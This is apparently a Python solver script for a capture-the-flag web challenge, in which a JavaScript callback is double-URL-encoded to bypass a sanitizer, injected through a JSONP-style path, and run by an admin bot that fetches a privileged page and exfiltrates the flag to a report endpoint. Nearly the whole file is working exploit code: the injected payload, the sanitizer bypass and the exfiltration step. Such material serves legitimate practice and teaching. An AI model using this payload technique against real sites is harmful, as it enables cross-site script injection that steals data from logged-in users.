#!/usr/bin/env python3
import argparse
import re
import time
from urllib.parse import quote

import requests

FLAG_RE = re.compile(r"GRIZZ\{[^}]+\}")
TICKET_RE = re.compile(r'id="ticket">([A-Za-z0-9_\-]+)<')

def double_urlencode(s: str) -> str:
    once = quote(s, safe="")
    twice = quote(once, safe="")
    return twice

def main() -> int:
    ap = argparse.ArgumentParser(description="Solver: submit payload -> bot visits -> redeem one-time report.")
    ap.add_argument("base_url", help="e.g. http://127.0.0.1:1337")
    ap.add_argument("--polls", type=int, default=25)
    ap.add_argument("--interval", type=float, default=0.6)
    args = ap.parse_args()

    base = args.base_url.rstrip("/")

    # Callback:
    # - read ticket from location.search (bot appends ?ticket=...)
    # - fetch /bear-den (ranger-only, but bot has cookie)
    # - regex GRIZZ{...}
    # - exfil to /report?ticket=...&d=...
    cb = (
        "function(p){"
        "var q=new URLSearchParams(location.search);"
        "var ticket=q.get('ticket')||'';"
        "fetch('/bear-den').then(function(r){return r.text();}).then(function(t){"
        "var m=t.match(/GRIZZ\\{[^}]+\\}/);"
        "if(m){fetch('/report?ticket='+encodeURIComponent(ticket)+'&d='+encodeURIComponent(m[0]));}"
        "});"
        "}"
    )

    # Double-encode so the app.js sanitizer preserves JS syntax via %xx sequences.
    cb_twice = double_urlencode(cb)
    path = f"/?mood=/api/pollen?wind={cb_twice}"

    # Submit
    r = requests.post(base + "/submit", data={"path": path}, timeout=10)
    if r.status_code != 200:
        print("[!] Submit failed:", r.status_code)
        print(r.text[:800])
        return 2

    m = TICKET_RE.search(r.text)
    if not m:
        print("[!] Could not extract ticket from /submit response.")
        print(r.text[:800])
        return 2

    ticket = m.group(1)
    print("[*] Ticket:", ticket)
    print("[*] One-time report:", f"{base}/reports?ticket={ticket}")

    # Poll reports until it appears
    for i in range(args.polls):
        rr = requests.get(base + "/reports", params={"ticket": ticket}, timeout=10)
        if rr.status_code != 200:
            print(f"[!] Poll {i+1}: status={rr.status_code}")
            time.sleep(args.interval)
            continue

        fm = FLAG_RE.search(rr.text)
        if fm:
            print("[+] Flag:", fm.group(0))
            return 0

        print(f"[*] Poll {i+1}/{args.polls}: not yet")
        time.sleep(args.interval)

    print("[!] Timed out waiting for report (bot may be down or payload broke).")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
